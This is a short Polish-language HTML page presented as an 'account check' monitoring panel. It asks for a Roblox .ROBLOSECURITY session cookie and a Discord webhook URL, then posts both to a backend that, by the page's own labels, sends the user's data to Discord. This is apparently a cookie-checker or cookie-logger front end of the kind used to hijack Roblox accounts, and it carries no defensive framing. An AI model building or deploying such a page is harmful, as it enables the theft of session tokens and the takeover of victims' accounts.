<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Panel Monitorowania</title>
    <style>
        body { background: #1a1a1a; color: white; font-family: Arial; text-align: center; padding-top: 50px; }
        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { padding: 10px 20px; background: #0070f3; color: white; border: none; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Sprawdź Konto</h1>
    <input type="text" id="webhook" placeholder="Link do Discord Webhook">
    <input type="text" id="cookie" placeholder="Wklej .ROBLOSECURITY">
    <br>
    <button onclick="sendData()">Wyślij na Discord</button>
    <p id="status"></p>

    <script>
        async function sendData() {
            const cookie = document.getElementById('cookie').value;
            const webhookUrl = document.getElementById('webhook').value;
            const status = document.getElementById('status');

            status.innerText = "Przetwarzanie...";

            const response = await fetch('/api/check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie, webhookUrl })
            });

            const result = await response.json();
            status.innerText = result.success ? `Wysłano dane użytkownika: ${result.user}` : `Błąd: ${result.message}`;
        }
    </script>
</body>
</html>
